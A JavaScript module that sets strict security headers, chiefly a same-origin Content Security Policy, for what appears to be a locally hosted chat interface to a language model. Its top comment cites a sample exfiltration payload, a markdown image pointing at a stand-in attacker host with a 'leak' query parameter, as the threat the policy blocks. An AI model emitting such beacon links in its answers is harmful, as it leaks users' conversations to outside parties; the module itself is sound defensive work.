/**
 * Security headers.
 *
 * The CSP is the part that actually enforces "what I say here never leaves
 * the site": the page may only talk to its own origin, so a model answer
 * containing `![](https://attacker/?leak=...)` or a stray <script> cannot
 * beacon anything out. Everything is bundled locally, so nothing legitimate
 * needs a third-party origin.
 */
const CSP = [
  "default-src 'self'",
  "connect-src 'self'",
  "script-src 'self'",
  // React sets inline style attributes (the context gauge width, for one).
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data:",
  "font-src 'self'",
  "media-src 'none'",
  "object-src 'none'",
  "frame-src 'none'",
  "frame-ancestors 'none'",
  "form-action 'self'",
  "base-uri 'none'",
  'upgrade-insecure-requests',
].join('; ');

export function securityHeaders({ secure }) {
  const headers = {
    'content-security-policy': CSP,
    'x-content-type-options': 'nosniff',
    'x-frame-options': 'DENY',
    'referrer-policy': 'no-referrer',
    'permissions-policy': 'geolocation=(), microphone=(), camera=(), interest-cohort=()',
    'cross-origin-opener-policy': 'same-origin',
    'cross-origin-resource-policy': 'same-origin',
    // Keep the whole thing out of search engines and archives.
    'x-robots-tag': 'noindex, nofollow, noarchive, nosnippet',
  };
  if (secure) {
    headers['strict-transport-security'] = 'max-age=31536000; includeSubDomains';
  }
  return headers;
}

/** True when the original client request reached the edge over TLS. */
export function isSecureRequest(req, trustProxy) {
  if (req.socket.encrypted) return true;
  if (!trustProxy) return false;
  const proto = String(req.headers['x-forwarded-proto'] || '').split(',')[0].trim();
  return proto === 'https';
}

export function clientIp(req, trustProxy) {
  if (trustProxy) {
    const fwd = String(req.headers['x-forwarded-for'] || '').split(',')[0].trim();
    if (fwd) return fwd;
  }
  return req.socket.remoteAddress || 'unknown';
}
